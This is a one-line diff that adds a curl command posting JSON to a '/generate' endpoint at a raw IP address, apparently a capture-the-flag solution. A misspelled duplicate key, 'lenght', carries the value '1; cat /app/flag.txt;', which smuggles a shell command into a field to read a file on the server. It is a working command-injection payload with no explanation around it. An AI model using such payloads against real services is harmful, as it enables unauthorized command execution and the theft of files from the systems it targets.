@@ -1,0 +1,1 @@
+curl 'http://13.37.17.31:50235/generate' -X POST -H 'Content-Type: application/json; charset=utf-8' --data-raw '{"value":{"length":"151","lenght":"1; cat /app/flag.txt;"}}'
